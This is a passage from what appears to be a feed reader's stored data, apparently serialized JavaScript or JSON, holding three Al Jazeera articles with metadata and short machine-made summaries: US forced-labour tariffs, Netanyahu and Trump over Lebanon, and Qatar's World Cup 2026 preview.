said the list of exemptions, stretching for more than 76 pages, suggested sensitivities over the potential cost-of-living hit to food and other goods with known forced-labour risks.</p><p>“It doesn’t make sense if the object of this is to enhance controls on modern slavery,” he said.</p></div></div>`,content_text:`The administration of US President Donald Trump has proposed new tariffs of up to 12.5 percent on imports from 60 economies after determining they had failed to curb trade in goods made with forced labour, an assertion that was rejected by US trading partners.The proposal from the Office of the United States Trade Representative (USTR), issued late on Tuesday, comes from a Section 301 unfair trade practices investigation designed to help rebuild US President Donald Trump’s emergency tariffs, struck down by a US Supreme Court decision in February.Recommended Stories list of 4 itemslist 1 of 4US artist sues FIFA over destruction of Dallas whale mural for World Cuplist 2 of 4Is Asia facing a new currency crisis?list 3 of 4Turkiye’s top diplomat, Indonesia’s president discuss $10bn trade goallist 4 of 4What is the St Petersburg forum, Putin’s economic outreach to the world?end of listDespite laws banning them, the products of forced labour are deeply embedded in supply chains across the world. European lawmakers bristle at the accusation that the region is less effective than the US at curbing the trade in such goods, with one describing the US findings as “utterly absurd”. Business leaders said the US move created more confusion for companies.The USTR proposed 10 percent additional duties on imports from Canada, Ecuador, the European Union, Indonesia, Mexico, Pakistan, Argentina, Bangladesh, Cambodia, El Salvador, Guatemala, Malaysia, Taiwan and Britain. The USTR said all had plans or partial schemes in place.The trade agency said it would impose additional duties of 12.5 percent on the remaining 45 countries that it investigated. These include China, India, Nigeria, Japan, South Korea, Vietnam, Australia and New Zealand.“The failure of our most important trading partners to address the importation of goods made with forced labour is unacceptable,” US Trade Representative Jamieson Greer said in a statement. “This creates a dynamic where American workers are forced to compete globally on an unlevel playing field.”The USTR said it would accept public comments on the proposed tariffs and other remedies through July 6, with a public hearing scheduled for July 7.The announcement comes ahead of the July 24 expiration of a 10 percent temporary tariff imposed by the Trump administration on February 20, the day the Supreme Court struck down Trump’s tariffs under the International Emergency Economic Powers Act. It also shows how determined the Trump administration is about building a wall of tariffs around the US economy, the world’s largest, despite repeated setbacks in court.After the loss in the Supreme Court, Trump turned to another law to impose temporary 10 percent tariffs globally. But those stopgap levies expire July 24. And a specialised trade court ruled last month that they, too, were illegal\xA0– though the government can continue collecting them while that case works its way through the courts.Unjustified tariffsThe European Commission said the tariffs were unjustified and\xA0reiterated its commitment\xA0to the trade deal sealed with Washington last year.Bernd Lange, the chair of the European Parliament’s trade committee, which\xA0voted on Tuesday to accept that trade deal, said the new tariffs were expected, but said the results of the US investigation were still “utterly absurd” given a 2024 EU law to ban imports of forced labour products.“The impression is increasingly emerging that a tariff measure is sought first, and only then is a suitable legal justification found,” he said. However, he added that the key question would be whether the additional tariffs would exceed those\xA0agreed\xA0between both sides last July.The US’s largest trading partner, the EU, agreed last July to accept tariffs of 15 percent on a broad range of its exports. In its report, the USTR said the EU anti-forced labour measures only came into force in December 2027 and lacked key elements.It was unclear whether the proposed tariffs – which the US release described as “additional duties” – would come on top of levies agreed in bilateral deals signed with the US.Britain said it was in regular talks with the US and was taking action to tackle forced labour. It added that the preferential access to US markets that it had negotiated for UK businesses remained in place.Mexico said that goods that were compliant under the United States-Mexico-Canada Agreement (USMCA) would be exempt from the new tariffs.Taiwan said it was\xA0“hopeful and confident”\xA0that the final results would reflect agreements already reached, securing relatively preferential treatment.Beijing, facing 12.5 percent tariffs, said that it opposed all forms of unilateral tariffs and that there was no forced labour in China.\xA0India, confronted with the same rate, said it was engaged with Washington on the Section 301 proceedings, noting the proposed tariffs were not final.“There will be deep concerns in the international business community that the US [forced labour law could] become a global template,” said Andrew Wilson, deputy secretary general of the International Chamber of Commerce.“Anyone can make a claim, get a shipment impounded and the company has to prove no forced labour in supply chain.”Certain exemptionsThe USTR said it would exempt from tariffs products including energy, rare earths and some other metals, beef, coffee, certain fruits and vegetables, pharmaceuticals, organic chemicals and aircraft parts.It also said it was proposing a textile mechanism that would allow for a certain volume of apparel and textile imports to enter the US at a reduced tariff rate, without giving details.The ICC’s Wilson said the list of exemptions, stretching for more than 76 pages, suggested sensitivities over the potential cost-of-living hit to food and other goods with known forced-labour risks.“It doesn’t make sense if the object of this is to enhance controls on modern slavery,” he said.`,summary:`• The US administration has proposed new tariffs of up to 12. 5% on imports from 60 economies after determining they had failed to curb trade in goods made with forced labour, an assertion that was rejected by US trading partners.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/05/reuters_6a037b5b-1778613083.jpg?resize=1920%2C1440`,published_at:1780506640,fetched_at:1780509343,content_hash:`be61e7126a37bbf9a80e65fd1c3444ddabff551638f5ac49450ceca36a35e34c`,tags:`News`,is_read:!1,is_starred:!1,is_later:!0,dup_count:0},{id:42,feed_id:11,guid:`https://www.aljazeera.com/?t=1780502363`,url:`https://www.aljazeera.com/news/2026/6/3/netanyahu-downplays-us-israel-rift-after-trump-confirms-criticism?traffic_source=rss`,title:`Netanyahu downplays US-Israel rift after Trump confirms criticism`,content_html:`<div id="readability-page-1" class="page"><div><p><em>US president acknowledges he had harsh words for Netanyahu over Lebanon attacks but says he ‘likes’ the Israeli leader.</em></p></div><div aria-live="polite" aria-atomic="true"><p>Benjamin Netanyahu has played down reports of a rift with <a href="https://www.aljazeera.com/news/2026/6/2/trump-berated-netanyahu-scepticism-abounds-about-us-israel-feud-rumour">Donald Trump</a> after the United States president confirmed that he recently called the Israeli prime minister “f****ing crazy”.</p><p>Asked during an interview with CNBC on Wednesday, Netanyahu rejected the idea his ties with Trump have shifted: “No, this has been this has been a great relationship because he’s been the greatest friend that Israel has ever had in the White House.”</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/sports/2026/6/3/israel-detains-palestine-international-football-player">Israel detains Palestine international women’s football player</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/news/2026/6/3/iran-kuwait-bahrain-hit-is-the-war-in-the-gulf-escalating-again">Iran, Kuwait, Bahrain hit: Is the war in the Gulf escalating again?</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/news/2026/6/3/why-is-france-so-invested-in-the-future-of-lebanon">Why is France so invested in the future of Lebanon?</a></li></ul><span>end of list</span></section><p>Netanyahu — who is wanted by the International Criminal Court (ICC) for <a href="https://www.aljazeera.com/news/2025/12/15/icc-rejects-israeli-bid-to-block-gaza-war-crimes-investigation">war crime charges</a> in Gaza — added that the two leaders have mutual respect for each other.</p><p>“We have common goals. Sometimes, we have, as in the best of families, you have these tactical disagreements,” he said.</p><p>“We always find a way to work them out, and we do so as great friends. We can disagree in the morning, and by the afternoon, we have common action.”</p><p>The comments came after Trump told the New York Post that he berated Netanyahu during a call earlier this week over Israel’s <a href="https://www.aljazeera.com/news/2026/6/3/israels-invasion-of-southern-lebanon-devastates-centuries-of-history">escalation in Lebanon</a>.</p><p>“I was a little bit perturbed at his constantly fighting with Lebanon,” Trump said.</p><p>Israel’s attacks in Lebanon, including an announcement that the Israeli military would bomb the capital, Beirut, have risked derailing the talks between the US and Iran.</p><p>Tehran has suggested that it may respond militarily to Israel’s assault in Lebanon.</p><p>Trump said on Monday that he spoke to Netanyahu and a representative from Hezbollah, and both sides agreed to hold fire.</p><p>But the fighting in southern Lebanon, where Israel has displaced hundreds of thousands of people and razed entire towns to the ground, has continued.</p><p>The Israeli military, however, did hold off its attacks against Beirut.</p><p>Despite the apparent disagreement over Lebanon, Trump lauded the Israeli prime minister on Wednesday, saying that he “works well” with him.</p><p>“I like Bibi a lot,” he said, using Netanyahu’s nickname.</p><p>For his part, Netanyahu stressed that he and Trump are on the same page in Lebanon and share the objective of disarming Hezbollah.</p><p>“I think he understands that Lebanon has been taken hostage by Hezbollah,” Netanyahu said.</p><p>Hezbollah, which is allied with Iran, says it is fighting against Israel’s aims to expand into Lebanon and ethnically cleanse the south of the country.</p><p>The Lebanese group argues that its fighting is legitimate under the United Nations Charter, which grants the right to self-defence to states and individuals.</p><p>After Israel and the US attacked Iran without direct provocation on February 28, fighting spilled over into Lebanon. Two days into the conflict, Hezbollah launched rockets against Israel in what it said was a response to the daily Israeli ceasefire violations and the killing of Iranian Supreme Leader <a href="https://www.aljazeera.com/news/2026/2/28/ayatollah-ali-khamenei-the-leader-who-shaped-irans-defiance">Ali Khamenei</a>.</p><p>Since the start of the regional war, several Israeli politicians have openly called for indefinitely capturing southern Lebanon and building settlements there.</p><p>In March, Israeli Defence Minister Israel Katz outlined a plan to occupy the south of the country and prevent hundreds of thousands of residents from returning to their homes.</p><p>Katz has also said he ordered “an acceleration in the destruction of Lebanese homes in contact-line villages”, admitting that the policy follows the model of the <a href="https://www.aljazeera.com/news/2026/5/31/satellite-imagery-shows-erasure-of-southern-gaza-as-israel-expands-control">annihilation of Rafah</a> and Beit Hanoon in Gaza.</p><p>But Netanyahu said on Wednesday that he wants “peace” with Lebanon.</p><p>“If we want to save Lebanon and if we want to get a Lebanese-Israeli peace, as I do, we have to disarm Hezbollah, and we have to demilitarise Lebanon,” the Israeli prime minister said. “I know that this is a goal that the president and I share.”</p><p>The demilitarisation of the entire country appears to be a new Israeli demand that would require preventing the Lebanese Armed Forces from acquiring weapons that could pose a threat to Israel.</p><p>Since April, Lebanese and Israeli officials have held several <a href="https://www.aljazeera.com/news/2026/6/2/lebanon-hopes-crunch-talks-in-washington-will-halt-an-israeli-invasion">rounds of talks</a> in the US, but the negotiations have failed to produce a ceasefire or halt Israel’s systemic destruction of Lebanese towns.</p></div></div>`,content_text:`US president acknowledges he had harsh words for Netanyahu over Lebanon attacks but says he ‘likes’ the Israeli leader.Benjamin Netanyahu has played down reports of a rift with Donald Trump after the United States president confirmed that he recently called the Israeli prime minister “f****ing crazy”.Asked during an interview with CNBC on Wednesday, Netanyahu rejected the idea his ties with Trump have shifted: “No, this has been this has been a great relationship because he’s been the greatest friend that Israel has ever had in the White House.”Recommended Stories list of 3 itemslist 1 of 3Israel detains Palestine international women’s football playerlist 2 of 3Iran, Kuwait, Bahrain hit: Is the war in the Gulf escalating again?list 3 of 3Why is France so invested in the future of Lebanon?end of listNetanyahu — who is wanted by the International Criminal Court (ICC) for war crime charges in Gaza — added that the two leaders have mutual respect for each other.“We have common goals. Sometimes, we have, as in the best of families, you have these tactical disagreements,” he said.“We always find a way to work them out, and we do so as great friends. We can disagree in the morning, and by the afternoon, we have common action.”The comments came after Trump told the New York Post that he berated Netanyahu during a call earlier this week over Israel’s escalation in Lebanon.“I was a little bit perturbed at his constantly fighting with Lebanon,” Trump said.Israel’s attacks in Lebanon, including an announcement that the Israeli military would bomb the capital, Beirut, have risked derailing the talks between the US and Iran.Tehran has suggested that it may respond militarily to Israel’s assault in Lebanon.Trump said on Monday that he spoke to Netanyahu and a representative from Hezbollah, and both sides agreed to hold fire.But the fighting in southern Lebanon, where Israel has displaced hundreds of thousands of people and razed entire towns to the ground, has continued.The Israeli military, however, did hold off its attacks against Beirut.Despite the apparent disagreement over Lebanon, Trump lauded the Israeli prime minister on Wednesday, saying that he “works well” with him.“I like Bibi a lot,” he said, using Netanyahu’s nickname.For his part, Netanyahu stressed that he and Trump are on the same page in Lebanon and share the objective of disarming Hezbollah.“I think he understands that Lebanon has been taken hostage by Hezbollah,” Netanyahu said.Hezbollah, which is allied with Iran, says it is fighting against Israel’s aims to expand into Lebanon and ethnically cleanse the south of the country.The Lebanese group argues that its fighting is legitimate under the United Nations Charter, which grants the right to self-defence to states and individuals.After Israel and the US attacked Iran without direct provocation on February 28, fighting spilled over into Lebanon. Two days into the conflict, Hezbollah launched rockets against Israel in what it said was a response to the daily Israeli ceasefire violations and the killing of Iranian Supreme Leader Ali Khamenei.Since the start of the regional war, several Israeli politicians have openly called for indefinitely capturing southern Lebanon and building settlements there.In March, Israeli Defence Minister Israel Katz outlined a plan to occupy the south of the country and prevent hundreds of thousands of residents from returning to their homes.Katz has also said he ordered “an acceleration in the destruction of Lebanese homes in contact-line villages”, admitting that the policy follows the model of the annihilation of Rafah and Beit Hanoon in Gaza.But Netanyahu said on Wednesday that he wants “peace” with Lebanon.“If we want to save Lebanon and if we want to get a Lebanese-Israeli peace, as I do, we have to disarm Hezbollah, and we have to demilitarise Lebanon,” the Israeli prime minister said. “I know that this is a goal that the president and I share.”The demilitarisation of the entire country appears to be a new Israeli demand that would require preventing the Lebanese Armed Forces from acquiring weapons that could pose a threat to Israel.Since April, Lebanese and Israeli officials have held several rounds of talks in the US, but the negotiations have failed to produce a ceasefire or halt Israel’s systemic destruction of Lebanese towns.`,summary:`• Netanyahu downplays Trump's criticism by rejecting the idea of a rift with the president and praising his leadership.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/2026-06-03T160104Z_1722566967_RC2KQIAFVKD7_RTRMADP_3_IRAN-CRISIS-ISRAEL-TRUMP-1780504697.jpg?resize=1920%2C1440`,published_at:1780506463,fetched_at:1780509343,content_hash:`1ae6872d6dbf4081c160cb6087b85256f16bcff0136eec1dee2b54e9c791d63b`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:48,feed_id:11,guid:`https://www.aljazeera.com/?t=1780463027`,url:`https://www.aljazeera.com/sports/2026/6/3/fifa-world-cup-2026-qatar-squad-team-players-group-knockouts?traffic_source=rss`,title:`FIFA World Cup 2026: Can Asian champions Qatar reach the knockouts?`,content_html:`<div id="readability-page-1" class="page"><div aria-live="polite" aria-atomic="true"><p><strong>Previous World Cup appearances</strong>: One<br/>
+<strong>Best performance</strong>: Group stage (2022)<br/>
+<strong>First appearance</strong>: 2022 (Qatar)<br/>
+<strong>Top goal scorer</strong>: Mohammed Muntari (1)<br/>
+<strong>Most appearances</strong>: Abdelkarim Hassan, Boualem Khoukhi, Akram Afif (3 each)<br/>
+<strong>Player to watch</strong>: Almoez Ali<br/>
+<strong>FIFA world ranking</strong>: 55</p><p>Four years on from their <a href="https://www.aljazeera.com/fifa-world-cup-2026">FIFA World Cup</a> debut on home soil, Qatar are gearing up for a new “dream”.</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/sports/2026/6/2/best-young-players-to-watch-at-fifa-world-cup-2026">From Yildiz to Diomande: Top 10 rising stars to watch at the World Cup</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/sports/2026/6/2/fifa-world-cup-2026-full-squads-48-teams-players">Who’s in, who’s out: Squads for all 48 FIFA World Cup 2026 nations</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/sports/2026/6/1/which-football-rule-changes-will-be-implemented-during-the-world-cup">Less time wastage, more red cards: New football rules at the World Cup</a></li></ul><span>end of list</span></section><p>The reigning – and back-to-back – Asian champions head to the June 11-July 19 football tournament in North America, having <a href="https://www.aljazeera.com/sports/2025/10/14/qatar-reach-world-cup-through-qualification-for-first-time-beating-uae">qualified outright</a> for the first time in the Arab nation’s history.</p><p>Making their way to the showpiece after three successful rounds of qualifiers, the Qataris find themselves in an interesting, and potentially inviting, Group B, facing Switzerland, Canada and Bosnia and Herzegovina.</p><p>The prospect of reaching the knockout stages for the first time appears a realistic target.</p><p>The task for the team, according to manager Julen Lopetegui in an exclusive interview with Al Jazeera, is to take the pressure off – but not at the cost of “ambition”.</p><p>Al Jazeera breaks down Qatar’s chances in North America:</p><h2 id="how-do-qatar-s-world-cup-opponents-rank">How do Qatar’s World Cup opponents rank?</h2><p>In Switzerland and Bosnia and Herzegovina, Qatar face two strong teams from Europe. Switzerland are making their 13th appearance at the finals, having reached the knockouts in each of their last three campaigns.</p><p>The 19th-ranked Swiss, whose best finish has been the quarterfinals on three occasions, are frontrunners to finish as table toppers of Group B.</p><p>At number 65 in the FIFA rankings, Bosnia and Herzegovina are placed lower than Qatar, but it would be foolish to write them off based on that alone. Returning to the World Cup for the first time in 12 years, Bosnia and Herzegovina pulled off one of the <a href="https://www.aljazeera.com/sports/2026/3/31/bosnia-and-herzegovina-dump-italy-out-of-world-cup-2026-qualifier">biggest upsets</a> of the qualifiers when they knocked out four-time world champions Italy on penalties.</p><p>Qatar can expect a tough challenge from both European teams, but the two-time Asian champions could take a point or three against <a href="https://www.aljazeera.com/sports/2026/6/1/canadas-world-cup-2026-team-preview-squad-players-to-watch-group-stage-matches#:~:text=Canada%20are%20playing%20only%20their,led%20by%20coach%20Jesse%20Marsch.">Canada</a>, the number 30 team in the world and the co-hosts of the tournament, alongside the United States and Mexico.</p><p>Like Qatar, Canada were also winless in their 2022 World Cup campaign, as well as in 2018. Making their third appearance at the finals, the Canadians, too, have yet to reach the knockouts.</p><p>Canada put on a mixed performance in their pre-World Cup friendlies, winning two and drawing two.</p><h2 id="no-pressure-as-lopetegui-urges-qatar-to-enjoy-the-moment">No pressure, as Lopetegui urges Qatar to enjoy the moment</h2><p>Talking to Al Jazeera ahead of the tournament, Qatar’s Spanish coach Lopetegui said the team achieved a “big goal” by qualifying for the 48-team World Cup on merit.</p><p>While the achievement is momentous for all of Qatar, it also holds special importance for Lopetegui, who is heading to his first World Cup as a coach.</p><p>Lopetegui was denied the chance to lead Spain at the 2018 World Cup, despite an impressive qualification, due to his country’s fury at the announcement of his upcoming role at Real Madrid only days before Spain’s first match at the event.</p><p>This year’s tournament, as a result, will finally hand the 59-year-old the chance he has long waited for.</p><p>“We are preparing for this next big challenge, which is to try to be competitive in the next step of our dream,” Lopetegui told Al Jazeera.</p><p>“The thing that we cannot feel is pressure. We have to enjoy because we won the right to be there [at the World Cup].</p><p>“The way I understand it, you can enjoy better [by] being competitive. The word pressure – it’s not in our language.”</p><figure id="attachment_4623282" aria-describedby="caption-attachment-4623282"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/06/2025-10-14T193033Z_258326849_UP1ELAE1I6V5T_RTRMADP_3_SOCCER-WORLDCUP-QAT-ARE-1780486093.jpg?w=770&amp;resize=770%2C533&amp;quality=80" alt="Soccer Football - FIFA World Cup - AFC Qualifiers - Group A - Qatar v United Arab Emirates - Jassim Bin Hamad Stadium, Doha, Qatar - October 14, 2025 Qatar coach Julen Lopetegui celebrates with Hassan Al Haydos after qualifying for the FIFA World Cup REUTERS/Ibraheem Al Omari" fetchpriority="low"/><figcaption id="caption-attachment-4623282">Qatar’s Spanish coach Julen Lopetegui took charge a year ago [Ibraheem Al Omari/Reuters]</figcaption></figure><p>Lopetegui, who took over in May 2025, admitted that while Qatar are weaker than their opponents, there is no shortage of ambition among his players.</p><p>“Each moment that you have at the World Cup is top,” he added.</p><p>“So in this case, you analyse each country, talking about each player and which competition they are playing… you’re playing against the best players in the world. Now, we have to be ready and prepare ourselves to be competitive.</p><p>“For sure, we will be playing against teams better than us; we have to accept this. But, to accept that is not to [say] that we don’t have the ambition to be competitive or to win there. They’re different things.”</p><h2 id="who-are-qatar-s-best-players">Who are Qatar’s best players?</h2><p>If Qatar are to crush Canadian hopes in Vancouver, the Gulf country will have to rely on the goal-scoring prowess of striker Almoez Ali, Qatar’s all-time marksman with 60 goals, and star winger Akram Afif, the two-time Asian player of the year and the team’s main source of creativity.</p><p>Having played every minute of Qatar’s last World Cup campaign, Afif shares the record for most appearances at the tournament (three) alongside defenders Boualem Khoukhi and Abdelkarim Hassan.</p><p>Captain Hassan Al-Haydos, who came out of retirement in June 2025 at Lopetegui’s request, is another fan favourite and holds the record of being Qatar’s most-capped player with 188 appearances.</p><figure id="attachment_4622905" aria-describedby="caption-attachment-4622905"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/06/2025-10-14T170500Z_1417843021_UP1ELAE1BGBWR_RTRMADP_3_SOCCER-WORLDCUP-QAT-ARE-1780479484.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="Soccer Football - FIFA World Cup - AFC Qualifiers - Group A - Qatar v United Arab Emirates - Jassim Bin Hamad Stadium, Doha, Qatar - October 14, 2025 Qatar&#39;s Akram Afif, Sultan Al-Brake, Karim Boudiaf, Mohamed Naceur Almanai and Almoez Ali during the national anthems before the match REUTERS/Ibraheem Al Omari" fetchpriority="low"/><figcaption id="caption-attachment-4622905">A favourable group and back-to-back Asian Cup titles have raised expectations [Ibraheem Al Omari/Reuters]</figcaption></figure><p>Qatar’s squad remains built around a domestically developed core shaped through the Aspire Academy system that underpinned their rise over the past decade.</p><p>Many of the squad have progressed through the same development pathway, giving Qatar continuity and ⁠cohesion, though questions remain over whether a group drawn largely ⁠from the domestic league has the depth and experience required to compete consistently with elite opposition.</p><h2 id="qatar-s-world-cup-2026-schedule">Qatar’s World Cup 2026 schedule</h2><p><em>All times in local time</em></p><ul>
+<li>June 13, 12pm PDT (19:00 GMT) – Qatar vs Switzerland – Santa Clara, California (US)</li>
+<li>June 18, 4pm PDT(23:00 GMT) – Canada vs Qatar – Vancouver (Canada)</li>
+<li>June 24, 12pm PDT (19:00 GMT) – Bosnia and Herzegovina vs Qatar – Inglewood, California (US)</li>
+</ul><figure id="attachment_4622111" aria-describedby="caption-attachment-4622111"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/06/2026-06-01T130203Z_1184404323_RC2SPX9E71CH_RTRMADP_3_SOCCER-WORLDCUP-GROUPB-QATAR-1780465015.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="FILE PHOTO: Soccer Football - FIFA World Cup Qatar 2022 - Group A - Qatar v Ecuador - Al Bayt Stadium, Al Khor, Qatar - November 20, 2022 Qatar fans react inside the stadium before the match REUTERS/Kai Pfaffenbach/File Photo" fetchpriority="low"/><figcaption id="caption-attachment-4622111">Qatar fans saw their side play at a World Cup for the first time when hosting the football tournament in 2022\xA0 [File: Kai Pfaffenbach/Reuters]</figcaption></figure><h2 id="al-jazeera-s-prediction">Al Jazeera’s prediction</h2><p>Qatar have a chance, even if it is a slim one, of reaching the knockouts.</p><p>Their best bet for collecting points is against Canada. Should Qatar beat Canada, they will have three points, which should be enough to qualify for the round of 32 as one of the eight best third-placed teams.</p><p>If Qatar draw all three games – which is less likely than the above scenario – even that could see them through to the knockouts for the first time in history.</p><p>Simply put, the game against Canada is a must-win for Qatar if they dream of a deep run.</p><h2 id="qatar-s-world-cup-squad">Qatar’s World Cup squad</h2><p><strong>Goalkeepers</strong>: Salah Zakaria, Meshaal Barsham, Mahmud Abunada</p><p><strong>Defenders</strong>: Boualem Khoukhi, Pedro Miguel, Sultan Al-Brake, Al-Hashmi Al-Hussain, Ayoub Al-Oui, Issa Laye, Lucas Mendes, Homam Al-Amin</p><p><strong>Midfielders</strong>: Ahmed Fathi, Jassim Gaber, Assim Madibo, Abdulaziz Hatem, Karim Boudiaf, Mohamed Al-Mannai</p><p><strong>Forwards</strong>: Almoez Ali, Akram Afif, Tahsin Mohammed Jamshid, Edmilson Junior, Ahmed Al-Ganehi, Ahmed Alaaeldin, Hassan Al-Haydos, Mohammed Muntari, Yusuf Abdurisag</p><p><em>The FIFA World Cup begins on June 11. You can follow the action on Al Jazeera’s dedicated\xA0<a href="https://www.aljazeera.com/fifa-world-cup-2026/">World Cup 2026</a>\xA0page with all the latest news, match build-up and live text commentary, and keep up to date with group standings, real-time match results and schedules.</em></p></div></div>`,content_text:`Previous World Cup appearances: One
+Best performance: Group stage (2022)
+First appearance: 2022 (Qatar)
+Top goal scorer: Mohammed Muntari (1)
+Most appearances: Abdelkarim Hassan, Boualem Khoukhi, Akram Afif (3 each)
+Player to watch: Almoez Ali
+FIFA world ranking: 55Four years on from their FIFA World Cup debut on home soil, Qatar are gearing up for a new “dream”.Recommended Stories list of 3 itemslist 1 of 3From Yildiz to Diomande: Top 10 rising stars to watch at the World Cuplist 2 of 3Who’s in, who’s out: Squads for all 48 FIFA World Cup 2026 nationslist 3 of 3Less time wastage, more red cards: New football rules at the World Cupend of listThe reigning – and back-to-back – Asian champions head to the June 11-July 19 football tournament in North America, having qualified outright for the first time in the Arab nation’s history.Making their way to the showpiece after three successful rounds of qualifiers, the Qataris find themselves in an interesting, and potentially inviting, Group B, facing Switzerland, Canada and Bosnia and Herzegovina.The prospect of reaching the knockout stages for the first time appears a realistic target.The task for the team, according to manager Julen Lopetegui in an exclusive interview with Al Jazeera, is to take the pressure off – but not at the cost of “ambition”.Al Jazeera breaks down Qatar’s chances in North America:How do Qatar’s World Cup opponents rank?In Switzerland and Bosnia and Herzegovina, Qatar face two strong teams from Europe. Switzerland are making their 13th appearance at the finals, having reached the knockouts in each of their last three campaigns.The 19th-ranked Swiss, whose best finish has been the quarterfinals on three occasions, are frontrunners to finish as table toppers of Group B.At number 65 in the FIFA rankings, Bosnia and Herzegovina are placed lower than Qatar, but it would be foolish to write them off based on that alone. Returning to the World Cup for the first time in 12 years, Bosnia and Herzegovina pulled off one of the biggest upsets of the qualifiers when they knocked out four-time world champions Italy on penalties.Qatar can expect a tough challenge from both European teams, but the two-time Asian champions could take a point or three against Canada, the number 30 team in the world and the co-hosts of the tournament, alongside the United States and Mexico.Like Qatar, Canada were also winless in their 2022 World Cup campaign, as well as in 2018. Making their third appearance at the finals, the Canadians, too, have yet to reach the knockouts.Canada put on a mixed performance in their pre-World Cup friendlies, winning two and drawing two.No pressure, as Lopetegui urges Qatar to enjoy the momentTalking to Al Jazeera ahead of the tournament, Qatar’s Spanish coach Lopetegui said the team achieved a “big goal” by qualifying for the 48-team World Cup on merit.While the achievement is momentous for all of Qatar, it also holds special importance for Lopetegui, who is heading to his first World Cup as a coach.Lopetegui was denied the chance to lead Spain at the 2018 World Cup, despite an impressive qualification, due to his country’s fury at the announcement of his upcoming role at Real Madrid only days before Spain’s first match at the event.This year’s tournament, as a result, will finally hand the 59-year-old the chance he has long waited for.“We are preparing for this next big challenge, which is to try to be competitive in the next step of our dream,” Lopetegui told Al Jazeera.“The thing that we cannot feel is pressure. We have to enjoy because we won the right to be there [at the World Cup].“The way I understand it, you can enjoy better [by] being competitive. The word pressure – it’s not in our language.”Qatar’s Spanish coach Julen Lopetegui took charge a year ago [Ibraheem Al Omari/Reuters]Lopetegui, who took over in May 2025, admitted that while Qatar are weaker than their opponents, there is no shortage of ambition among his players.“Each moment that you have at the World Cup is top,” he added.“So in this case, you analyse each country, talking about each player and which competition they are playing… you’re playing against the best players in the world. Now, we have to be ready and prepare ourselves to be competitive.“For sure, we will be playing against teams better than us; we have to accept this. But, to accept that is not to [say] that we don’t have the ambition to be competitive or to win there. They’re different things.”Who are Qatar’s best players?If Qatar are to crush Canadian hopes in Vancouver, the Gulf country will have to rely on the goal-scoring prowess of striker Almoez Ali, Qatar’s all-time marksman with 60 goals, and star winger Akram Afif, the two-time Asian player of the year and the team’s main source of creativity.Having played every minute of Qatar’s last World Cup campaign, Afif shares the record for most appearances at the tournament (three) alongside defenders Boualem Khoukhi and Abdelkarim Hassan.Captain Hassan Al-Haydos, who came out of retirement in June 2025 at Lopetegui’s request, is another fan favourite and holds the record of being Qatar’s most-capped player with 188 appearances.A favourable group and back-to-back Asian Cup titles have raised expectations [Ibraheem Al Omari/Reuters]Qatar’s squad remains built around a domestically developed core shaped through the Aspire Academy system that underpinned their rise over the past decade.Many of the squad have progressed through the same development pathway, giving Qatar continuity and ⁠cohesion, though questions remain over whether a group drawn largely ⁠from the domestic league has the depth and experience required to compete consistently with elite opposition.Qatar’s World Cup 2026 scheduleAll times in local time
+June 13, 12pm PDT (19:00 GMT) – Qatar vs Switzerland – Santa Clara, California (US)
+June 18, 4pm PDT(23:00 GMT) – Canada vs Qatar – Vancouver (Canada)
+June 24, 12pm PDT (19:00 GMT) – Bosnia and Herzegovina vs Qatar – Inglewood, California (US)
+Qatar fans saw their side play at a World Cup for the first time when hosting the football tournament in 2022\xA0 [File: Kai Pfaffenbach/Reuters]Al Jazeera’s predictionQatar have a chance, even if it is a slim one, of reaching the knockouts.Their best bet for collecting points is against Canada. Should Qatar beat Canada, they will have three points, which should be enough to qualify for the round of 32 as one of the eight best third-placed teams.If Qatar draw all three games – which is less likely than the above scenario – even that could see them through to the knockouts for the first time in history.Simply put, the game against Canada is a must-win for Qatar if they dream of a deep run.Qatar’s World Cup squadGoalkeepers: Salah Zakaria, Meshaal Barsham, Mahmud AbunadaDefenders: Boualem Khoukhi, Pedro Miguel, Sultan Al-Brake, Al-Hashmi Al-Hussain, Ayoub Al-Oui, Issa Laye, Lucas Mendes, Homam Al-AminMidfielders: Ahmed Fathi, Jassim Gaber, Assim Madibo, Abdulaziz Hatem, Karim Boudiaf, Mohamed Al-MannaiForwards: Almoez Ali, Akram Afif, Tahsin Mohammed Jamshid, Edmilson Junior, Ahmed Al-Ganehi, Ahmed Alaaeldin, Hassan Al-Haydos, Mohammed Muntari, Yusuf AbdurisagThe FIFA World Cup begins on June 11. You can follow the action on Al Jazeera’s dedicated\xA0World Cup 2026\xA0page with all the latest news, match build-up and live text commentary, and keep up to date with group standings, real-time match results and schedules.`,summary:`• FIFA World Cup 2026: Can Asian champions Qatar reach the knockouts?
